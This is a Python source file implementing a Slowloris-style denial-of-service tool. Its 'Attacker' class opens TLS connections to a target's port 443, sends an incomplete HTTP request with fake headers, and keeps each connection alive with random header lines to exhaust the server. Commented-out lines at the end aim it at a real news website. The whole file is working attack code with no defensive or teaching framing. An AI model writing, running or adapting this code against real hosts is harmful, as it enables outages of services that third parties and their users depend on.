import socket
import ssl
import random


class Attacker:
    def __init__(self, target):
        self.target = target
        self.port = 443
        self.loris = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.status = "Unconnected"




        self.fakeHeaderList = [
            "User-agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, Gecko) Chrome/55.0.2919.83 Safari/537.36",
            "Accept-language: ru,q=0.5",
            "Connection: Keep-Alive"
        ]
    #This method creates the sockets that will be used in the attack
    def createSocket(self):


        try:
            self.loris = ssl.wrap_socket(self.loris, ssl_version=ssl.PROTOCOL_SSLv23)

            self.loris.connect((self.target, self.port))

            request = "GET / HTTP/1.1\nHost: " + self.target + "\r\n\r\n"
            self.loris.send(request.encode())



            #Send fake header elements to target
            for element in self.fakeHeaderList:
                self.loris.send(bytes(bytes("{}\r\n".format(element).encode("utf-8"))))


            #info = self.loris.recv(10000)

            #print(info.decode("utf-8"))


            self.status = "Connected to " + self.target + " Target on port 443"
        except Exception as e:
            print(e)




    #Method that starts the attack on the target
    def attackTarget(self):
        try:
            self.stayAlive()

        except Exception as e:
            print(e)

        self.status = "Attacking "+self.target+""

    #Calls on a socket to stay alive
    def stayAlive(self):
        self.loris.send("X-a: {}\r\n".format(random.randint(1,1000)).encode("utf-8"))
        pass
    #Return the current status of the Attacker

    def returnStatus(self):
        return self.status

#test = Attacker("www.cnn.com")
#test.createSocket()
#test.attackTarget()
